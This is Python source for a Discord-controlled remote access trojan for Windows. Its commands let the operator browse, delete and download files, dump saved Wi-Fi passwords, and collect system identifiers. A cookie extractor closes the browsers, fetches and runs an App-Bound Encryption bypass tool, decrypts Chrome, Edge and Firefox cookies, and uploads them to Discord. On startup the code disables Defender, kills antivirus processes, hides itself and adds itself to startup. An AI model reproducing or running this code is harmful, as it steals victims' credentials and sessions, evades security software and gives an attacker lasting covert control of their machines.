@bot.command()
async def cd(ctx, *, path: str):
    global current_dir
    try:
        new_path = os.path.abspath(os.path.join(current_dir, path))
        if os.path.isdir(new_path):
            current_dir = new_path
            await ctx.send(f"Changed directory to `{current_dir}`{watermark()}")
        else:
            await ctx.send(f"Directory not found: `{new_path}`{watermark()}")
    except Exception as e:
        await ctx.send(f"Error changing directory: {e}{watermark()}")

@bot.command()
async def rm(ctx, *, filename: str):
    try:
        target = os.path.join(current_dir, filename)
        if os.path.isfile(target):
            os.remove(target)
            await ctx.send(f"Deleted file `{filename}`{watermark()}")
        else:
            await ctx.send(f"File not found: `{filename}`{watermark()}")
    except Exception as e:
        await ctx.send(f"Error deleting file: {e}{watermark()}")

@bot.command()
async def rmd(ctx, *, dirname: str):
    try:
        target = os.path.join(current_dir, dirname)
        if os.path.isdir(target):
            shutil.rmtree(target)
            await ctx.send(f"Deleted directory `{dirname}`{watermark()}")
        else:
            await ctx.send(f"Directory not found: `{dirname}`{watermark()}")
    except Exception as e:
        await ctx.send(f"Error deleting directory: {e}{watermark()}")

from discord import File

@bot.command()
async def download(ctx, *, filename: str):
    try:
        target = os.path.join(current_dir, filename)
        if os.path.isfile(target):
            await ctx.send(file=File(target))
            await ctx.send(f"File sent: `{filename}`{watermark()}")
        else:
            await ctx.send(f"File not found: `{filename}`{watermark()}")
    except Exception as e:
        await ctx.send(f"Error sending file: {e}{watermark()}")

@bot.command()
async def uuid(ctx):
    try:
        result = subprocess.check_output(
            "wmic csproduct get uuid", shell=True, text=True
        )
        await ctx.send(f"**UUID:**\n```\n{result.strip()}\n```{watermark()}")
    except Exception as e:
        await ctx.send(f"Error getting UUID: {e}{watermark()}")

@bot.command()
async def mac(ctx):
    try:
        result = subprocess.check_output("getmac", shell=True, text=True)
        await ctx.send(f"**MAC Addresses:**\n```\n{result.strip()}\n```{watermark()}")
    except Exception as e:
        await ctx.send(f"Error getting MAC address: {e}{watermark()}")

@bot.command()
async def dns(ctx):
    try:
        result = subprocess.check_output("ipconfig /all", shell=True, text=True)
        dns_lines = [
            line
            for line in result.splitlines()
            if "DNS Servers" in line or line.strip().startswith("DNS")
        ]
        dns_lines = ["No DNS info found."] if not dns_lines else dns_lines
        await ctx.send(
            "**DNS Info:**\n```\n" + "\n".join(dns_lines) + f"\n```{watermark()}"
        )
    except Exception as e:
        await ctx.send(f"Error getting DNS info: {e}{watermark()}")

@bot.command()
async def wifi(ctx):
    try:
        result = subprocess.check_output(
            "netsh wlan show interfaces", shell=True, text=True
        )
        await ctx.send(
            f"**Connected WiFi Info:**\n```\n{result.strip()}\n```{watermark()}"
        )
    except Exception as e:
        await ctx.send(f"Error getting WiFi info: {e}{watermark()}")

@bot.command()
async def wifi_passwords(ctx):
    try:
        profiles = subprocess.check_output(
            "netsh wlan show profiles", shell=True, text=True
        )
        profile_names = [
            line.split(":")[1].strip()
            for line in profiles.splitlines()
            if "All User Profile" in line
        ]

        passwords = []
        for name in profile_names:
            try:
                pw_info = subprocess.check_output(
                    f'netsh wlan show profile name="{name}" key=clear',
                    shell=True,
                    text=True,
                    stderr=subprocess.DEVNULL,
                )

                password = None
                for line in pw_info.splitlines():
                    if "Key Content" in line:
                        password = line.split(":")[1].strip()
                        break

                if password:
                    passwords.append(f"{name}: {password}")
                else:
                    passwords.append(f"{name}: <No password found>")

            except Exception as e:
                passwords.append(f"{name}: <Error retrieving password>")

        if passwords:
            output = (
                "**WiFi Passwords:**\n```\n"
                + "\n".join(passwords)
                + f"\n```{watermark()}"
            )
            if len(output) > 2000:
                parts = [output[i : i + 2000] for i in range(0, len(output), 2000)]
                for part in parts:
                    await ctx.send(part)
            else:
                await ctx.send(output)
        else:
            await ctx.send(f"No WiFi profiles found{watermark()}")
    except Exception as e:
        await ctx.send(f"❌ Error getting WiFi passwords: {str(e)}{watermark()}")

@bot.command()
async def systeminfo(ctx):
    try:
        result = subprocess.check_output("systeminfo", shell=True, text=True)
        await ctx.send(f"**System Info:**\n```\n{result[:1900]}\n```{watermark()}")
    except Exception as e:
        await ctx.send(f"Error getting system info: {e}{watermark()}")

@bot.command()
async def cpu(ctx):
    try:
        result = subprocess.check_output("wmic cpu get name", shell=True, text=True)
        await ctx.send(f"**CPU Info:**\n```\n{result.strip()}\n```{watermark()}")
    except Exception as e:
        await ctx.send(f"Error getting CPU info: {e}{watermark()}")

@bot.command()
async def gpu(ctx):
    try:
        result = subprocess.check_output(
            "wmic path win32_VideoController get name", shell=True, text=True
        )
        await ctx.send(f"**GPU Info:**\n```\n{result.strip()}\n```{watermark()}")
    except Exception as e:
        await ctx.send(f"Error getting GPU info: {e}{watermark()}")

@bot.command()
async def ram(ctx):
    try:
        result = subprocess.check_output(
            "wmic memorychip get capacity", shell=True, text=True
        )
        lines = result.strip().split("\n")[1:]
        total_bytes = sum(int(line.strip()) for line in lines if line.strip())
        total_gb = round(total_bytes / (1024**3), 2)

        result = subprocess.check_output(
            "wmic memorychip get speed,partnumber,manufacturer", shell=True, text=True
        )
        await ctx.send(
            f"**RAM Info:**\nTotal: {total_gb} GB\n```\n{result.strip()}\n```{watermark()}"
        )
    except Exception as e:
        await ctx.send(f"Error getting RAM info: {e}{watermark()}")
from discord import File
class AdvancedBrowserCookieExtractor:
    def __init__(self):
        self.system = platform.system()
        if self.system != "Windows":
            raise Exception("This advanced version is specifically designed for Windows (Chrome v127+ ABE support)")

        self.cookies_data = {}
        self.abe_tool_path = None
        self.temp_tool_dir = None

        print("🔓 Advanced Browser Cookie Extractor for Chrome v127+ ABE")
        print("Handles Chrome's App-Bound Encryption automatically")
        print("📱 Discord bot integration enabled")
        print()

        self.check_system_compatibility()

    def check_system_compatibility(self):
        """Check if the system is compatible with the ABE tool"""        
        system_info = {
            'system': platform.system(),
            'machine': platform.machine(),
            'processor': platform.processor(),
            'architecture': platform.architecture(),
            'release': platform.release(),
            'version': platform.version()
        }

        print("🔍 System Compatibility Check:")
        print(f"   OS: {system_info['system']} {system_info['release']}")
        print(f"   Architecture: {system_info['machine']} ({system_info['architecture'][0]})")
        print(f"   Processor: {system_info['processor'][:50]}...")

        if 'iot' in system_info['version'].lower() or 'iot' in system_info['release'].lower():
            print("⚠️  WARNING: Windows IoT Enterprise detected")
            print("   Some security tools may have compatibility issues")
            print("   You may need to run in compatibility mode or use alternative methods")

        print()  
        return system_info

    def close_browsers(self):
        """Close all browser processes on Windows"""
        browsers = [
            "chrome.exe",
            "msedge.exe", 
            "firefox.exe",
            "brave.exe",
            "opera.exe",
            "vivaldi.exe"
        ]

        closed_browsers = []

        for browser in browsers:
            try:
                result = subprocess.run(
                    ["tasklist", "/FI", f"IMAGENAME eq {browser}"],
                    capture_output=True, text=True, shell=True
                )

                if browser in result.stdout:
                    print(f"🔄 Closing {browser}...")
                    subprocess.run(["taskkill", "/F", "/IM", browser], 
                                 capture_output=True, shell=True)
                    closed_browsers.append(browser)
                    time.sleep(1)

            except Exception as e:
                print(f"⚠️  Warning: Could not close {browser}: {e}")

        if closed_browsers:
            print(f"✅ Closed browsers: {', '.join(closed_browsers)}")
            print("⏳ Waiting for processes to terminate...\n")
            time.sleep(3)
        else:
            print("ℹ️  No browsers were running\n")

        return closed_browsers

    def check_and_download_abe_tool(self):
        """Download the ABE decryption tool to temp directory"""

        temp_dir = tempfile.mkdtemp(prefix="abe_tool_")
        tool_exe = os.path.join(temp_dir, "chrome_inject.exe")

        print("📥 Downloading Chrome ABE decryption tool to temp directory...")

        try:

            release_url = "https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/download/v0.15.0/chrome-injector-v0.15.0.zip"
            zip_path = os.path.join(temp_dir, "chrome-injector-v0.15.0.zip")

            print("⬇️  Downloading chrome-injector-v0.15.0.zip...")
            urllib.request.urlretrieve(release_url, zip_path)

            with zipfile.ZipFile(zip_path, 'r') as zip_ref:

                arch = platform.machine().lower()
                print(f"🏗️  Detected architecture: {arch}")

                print(f"📂 Files in zip: {zip_ref.namelist()}")

                if 'arm' in arch or 'aarch64' in arch or 'arm64' in arch:
                    target_exe = "chromelevator_arm64.exe"
                    print("🎯 Target: ARM64 executable")
                else:
                    target_exe = "chromelevator_x64.exe" 
                    print("🎯 Target: x64 executable")

                found = False
                for member in zip_ref.namelist():
                    if member == target_exe:
                        print(f"📤 Extracting {member}...")
                        zip_ref.extract(member, temp_dir)

                        extracted_path = os.path.join(temp_dir, member)
                        if os.path.exists(extracted_path):
                            os.rename(extracted_path, tool_exe)
                            found = True
                            print(f"✅ Successfully extracted and renamed to chrome_inject.exe")
                        break

                if not found:
                    print(f"❌ Could not find {target_exe} in the zip file")
                    print("Available executables:")
                    for member in zip_ref.namelist():
                        if member.endswith('.exe'):
                            print(f"  - {member}")

                    if target_exe != "chromelevator_x64.exe":
                        fallback = "chromelevator_x64.exe"
                        print(f"🔄 Attempting fallback to {fallback}...")
                        for member in zip_ref.namelist():
                            if member == fallback:
                                print(f"📤 Extracting fallback: {member}...")
                                zip_ref.extract(member, temp_dir)
                                extracted_path = os.path.join(temp_dir, member)
                                if os.path.exists(extracted_path):
                                    os.rename(extracted_path, tool_exe)
                                    found = True
                                    print("⚠️  Using x64 version as fallback")
                                break

            os.remove(zip_path)

            if os.path.exists(tool_exe):
                print("✅ ABE decryption tool downloaded successfully")
                print(f"🗂️  Tool location: {tool_exe}")

                try:
                    test_result = subprocess.run([tool_exe, "--help"], 
                                               capture_output=True, text=True, timeout=10)
                    if test_result.returncode == 0 or "usage:" in test_result.stdout.lower() or "options:" in test_result.stdout.lower():
                        print("✅ Tool compatibility test passed")
                    else:
                        print("⚠️  Tool may have compatibility issues")
                        print(f"   Test output: {test_result.stderr[:100]}...")
                except Exception as e:
                    print(f"⚠️  Could not test tool compatibility: {e}")

                self.abe_tool_path = tool_exe
                self.temp_tool_dir = temp_dir  
                return True
            else:
                print("❌ Failed to extract ABE tool")
                print(f"❌ Expected path: {tool_exe}")
                return False

        except Exception as e:
            print(f"❌ Failed to download ABE tool: {e}")
            print("Please check your internet connection or try again later")

            try:
                shutil.rmtree(temp_dir)
            except:
                pass
            return False

    def extract_abe_cookies_advanced(self, browser="chrome"):
        """Extract ABE-encrypted cookies using the specialized tool"""
        if not self.abe_tool_path:
            if not self.check_and_download_abe_tool():
                print("❌ Cannot extract ABE cookies without the decryption tool")
                return []

        print(f"🔓 Extracting {browser.title()} ABE cookies using advanced method...")

        output_dir = tempfile.mkdtemp(prefix="abe_output_")

        try:

            cmd = [self.abe_tool_path, "--output-path", output_dir, browser.lower()]

            print(f"🚀 Running: {' '.join(cmd)}")
            result = subprocess.run(cmd, capture_output=True, text=True, cwd=os.path.dirname(self.abe_tool_path))

            if result.returncode == 0:
                print("✅ ABE decryption completed successfully")

                if result.stderr:
                    print("⚠️  Warnings:", result.stderr)

                cookies = self.parse_abe_output(output_dir, browser)

                try:
                    shutil.rmtree(output_dir)
                except:
                    pass

                return cookies
            else:
                print(f"❌ ABE decryption failed (exit code: {result.returncode})")
                if result.stderr:
                    print("Error:", result.stderr)
                if result.stdout:
                    print("Output:", result.stdout)

                try:
                    shutil.rmtree(output_dir)
                except:
                    pass

                return []

        except Exception as e:
            print(f"❌ Error running ABE tool: {e}")

            try:
                shutil.rmtree(output_dir)
            except:
                pass
            return []

    def parse_abe_output(self, output_dir, browser):
        """Parse the output from the ABE decryption tool"""
        cookies = []
        browser_dir = os.path.join(output_dir, browser.title())

        if not os.path.exists(browser_dir):
            print(f"⚠️  No output directory found for {browser}")
            return []

        for profile_name in os.listdir(browser_dir):
            profile_path = os.path.join(browser_dir, profile_name)
            if not os.path.isdir(profile_path):
                continue

            cookies_file = os.path.join(profile_path, "cookies.json")
            if os.path.exists(cookies_file):
                try:
                    with open(cookies_file, 'r', encoding='utf-8') as f:
                        profile_cookies = json.load(f)

                    for cookie in profile_cookies:
                        cookie['browser'] = browser.title()
                        cookie['profile'] = profile_name

                        if 'host' in cookie:
                            cookie['host'] = cookie['host']
                        cookies.append(cookie)

                    print(f"✅ Loaded {len(profile_cookies)} cookies from {browser} {profile_name}")

                except Exception as e:
                    print(f"❌ Error reading cookies from {cookies_file}: {e}")

        return cookies

    def get_firefox_path(self):
        """Get Firefox cookies database path"""
        profiles_path = os.path.expandvars(r'%APPDATA%\Mozilla\Firefox\Profiles')

        if os.path.exists(profiles_path):
            for profile in os.listdir(profiles_path):
                if 'default' in profile.lower():
                    return os.path.join(profiles_path, profile, 'cookies.sqlite')
        return None

    def extract_firefox_cookies(self):
        """Extract cookies from Firefox (unchanged - Firefox doesn't use ABE)"""
        db_path = self.get_firefox_path()

        if not db_path or not os.path.exists(db_path):
            print("ℹ️  Firefox cookies database not found")
            return []

        temp_db = tempfile.mktemp(suffix='.sqlite')

        try:
            shutil.copy2(db_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()

            cursor.execute("""
                SELECT host, name, value, path, expiry, isSecure, isHttpOnly, creationTime
                FROM moz_cookies
            """)

            cookies = []
            for row in cursor.fetchall():
                host, name, value, path, expiry, is_secure, is_httponly, creation_time = row

                expires = None
                created = None

                if expiry:
                    try:
                        expires = datetime.fromtimestamp(expiry, tz=timezone.utc)
                    except:
                        expires = None

                if creation_time:
                    try:
                        created = datetime.fromtimestamp(creation_time / 1000000, tz=timezone.utc)
                    except:
                        created = None

                cookies.append({
                    'browser': 'Firefox',
                    'host': host,
                    'name': name,
                    'value': value,
                    'path': path,
                    'expires': expires.isoformat() if expires else None,
                    'secure': bool(is_secure),
                    'httponly': bool(is_httponly),
                    'created': created.isoformat() if created else None
                })

            conn.close()
            print(f"✅ Extracted {len(cookies)} cookies from Firefox")
            return cookies

        except Exception as e:
            print(f"❌ Error extracting Firefox cookies: {e}")
            return []
        finally:
            if os.path.exists(temp_db):
                os.remove(temp_db)

    def extract_all_cookies(self, close_browsers=True):
        """Extract cookies from all supported browsers using ABE-aware methods"""
        all_cookies = []

        if close_browsers:
            self.close_browsers()

        print("🚀 Starting advanced cookie extraction...\n")

        print("🔓 Extracting Chrome cookies (ABE-aware)...")
        chrome_cookies = self.extract_abe_cookies_advanced("chrome")
        all_cookies.extend(chrome_cookies)

        print("\n🔓 Extracting Edge cookies (ABE-aware)...")
        edge_cookies = self.extract_abe_cookies_advanced("edge")
        all_cookies.extend(edge_cookies)

        print("\n🦊 Extracting Firefox cookies (standard method)...")
        firefox_cookies = self.extract_firefox_cookies()
        all_cookies.extend(firefox_cookies)

        return all_cookies

    def save_to_json(self, cookies, filename="browser_cookies_decrypted.json"):
        """Save cookies to JSON file"""
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(cookies, f, indent=2, ensure_ascii=False)
        print(f"💾 Decrypted cookies saved to {filename}")
        return filename

    def get_cookies_summary(self, cookies):
        """Get summary statistics of extracted cookies"""
        if not cookies:
            return "❌ No cookies found"

        browsers = {}
        domains = {}
        decrypted_count = 0

        for cookie in cookies:
            browser = cookie.get('browser', 'Unknown')
            browsers[browser] = browsers.get(browser, 0) + 1

            host = cookie.get('host', 'Unknown')
            domains[host] = domains.get(host, 0) + 1

            value = cookie.get('value', '')
            if value and not value.startswith('[ENCRYPTED'):
                decrypted_count += 1

        summary = f"""🍪 **Cookie Extraction Summary:**
```
Total cookies: {len(cookies)}
Successfully decrypted: {decrypted_count}
Encryption bypass rate: {(decrypted_count/len(cookies)*100):.1f}%

📊 By browser:
{chr(10).join(f"  {browser}: {count}" for browser, count in browsers.items())}

🌐 Top 10 domains:
{chr(10).join(f"  {domain}: {count}" for domain, count in sorted(domains.items(), key=lambda x: x[1], reverse=True)[:10])}
```"""

        return summary

    def cleanup(self):
        """Clean up temporary files and directories"""
        if hasattr(self, 'temp_tool_dir') and self.temp_tool_dir and os.path.exists(self.temp_tool_dir):
            try:
                print("🧹 Cleaning up temporary files...")
                shutil.rmtree(self.temp_tool_dir)
                print("✅ Cleanup completed")
            except Exception as e:
                print(f"⚠️  Warning: Could not clean up temp directory: {e}")

    def __del__(self):
        """Destructor to ensure cleanup"""
        self.cleanup()

    extractor = None
extractor = None
from discord import File
@bot.command(name='browsers')
async def extract_browsers_command(ctx):
    """Extract browser cookies and send to Discord"""
    global extractor

    initial_msg = await ctx.send("🔄 **Starting cookie extraction...**\nThis may take a few minutes.")

    try:
        if not extractor:
            extractor = AdvancedBrowserCookieExtractor()

        await initial_msg.edit(content="🔄 **Closing browsers and extracting cookies...**")

        def extract_cookies():
            return extractor.extract_all_cookies(close_browsers=True)

        loop = asyncio.get_event_loop()
        cookies = await loop.run_in_executor(None, extract_cookies)

        if not cookies:
            await initial_msg.edit(content="❌ **No cookies found or extraction failed**")
            return

        summary = extractor.get_cookies_summary(cookies)
        await initial_msg.edit(content=f"✅ **Cookie extraction completed!**\n\n{summary}")

        filename = extractor.save_to_json(cookies)

        file_size = os.path.getsize(filename)
        if file_size < 8 * 1024 * 1024:  
            with open(filename, 'rb') as f:
                discord_file = File(f, filename=f"cookies_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
                await ctx.send("📎 **Cookies file:**", file=discord_file)
        else:
            await ctx.send(f"⚠️ **File too large for Discord** ({file_size/1024/1024:.1f}MB)\nSaved locally as: `{filename}`")

        try:
            os.remove(filename)
        except:
            pass

    except Exception as e:
        await initial_msg.edit(content=f"❌ **Error during extraction:**\n```{str(e)[:1000]}```")

@bot.command()
async def drives(ctx):
    try:
        result = subprocess.check_output(
            "wmic logicaldisk get name,size,freespace,description",
            shell=True,
            text=True,
        )
        lines = result.strip().split("\n")

        output_lines = []
        headers = lines[0].split()
        output_lines.append(f"{'Drive':<6} {'Type':<15} {'Total':<10} {'Free':<10}")

        for line in lines[1:]:
            if not line.strip():
                continue
            parts = line.split()
            if len(parts) >= 4:
                drive = parts[0]
                desc = " ".join(parts[1:-2])
                size_bytes = int(parts[-2]) if parts[-2].isdigit() else 0
                free_bytes = int(parts[-1]) if parts[-1].isdigit() else 0

                size_gb = round(size_bytes / (1024**3), 2) if size_bytes else 0
                free_gb = round(free_bytes / (1024**3), 2) if free_bytes else 0

                output_lines.append(
                    f"{drive:<6} {desc:<15} {size_gb:>5} GB {free_gb:>5} GB"
                )

        await ctx.send(
            f"**Drives Info:**\n```\n" + "\n".join(output_lines) + f"\n```{watermark()}"
        )
    except Exception as e:
        await ctx.send(f"Error getting drives info: {e}{watermark()}")

@bot.command()
async def hostname(ctx):
    try:
        result = socket.gethostname()
        await ctx.send(f"**Hostname:** `{result}`{watermark()}")
    except Exception as e:
        await ctx.send(f"Error getting hostname: {e}{watermark()}")

@bot.command()
async def osinfo(ctx):
    try:
        result = subprocess.check_output("ver", shell=True, text=True)
        await ctx.send(f"**OS Version:**\n```\n{result.strip()}\n```{watermark()}")
    except Exception as e:
        await ctx.send(f"Error getting OS info: {e}{watermark()}")

@bot.command()
async def user(ctx):
    try:
        result = os.getlogin()
        await ctx.send(f"**Current User:** `{result}`{watermark()}")
    except Exception as e:
        await ctx.send(f"Error getting current user: {e}{watermark()}")

@bot.event
async def on_ready():

    disable_defender()
    add_exclusion(sys.argv[0])
    kill_av_processes()
    hide_process()
    add_to_startup()

    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)

    for channel in bot.get_all_channels():
        if isinstance(channel, TextChannel):
            try:
                await channel.send(
                    f"@everyone\n"
                    f"✅ **Connected - !help for command info.**\n"
                    f"• Hostname: `{hostname}`\n"
                    f"• IP: `{ip_address}`\n"
                    f"• Time: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`"
                    f"{watermark()}"
                )
                break
            except:
                continue

    print(f"Logged in as {bot.user.name}")
    bot.loop.create_task(send_periodic_updates())

ssl_context = ssl.create_default_context()
ssl_context.load_verify_locations(certifi.where())
RETRY_DELAY = 5
async def start_bot():
    while True:
        try:
            async with aiohttp.ClientSession() as session:
                async with bot:
                    bot.http.connector = aiohttp.TCPConnector(ssl=ssl_context)
                    await bot.start(TOKEN)
        except Exception as e:
            print(f"❌ Failed to start bot: {e}")
            print(f"🔁 Retrying in {RETRY_DELAY} seconds...")
            await asyncio.sleep(RETRY_DELAY)

asyncio.run(start_bot())
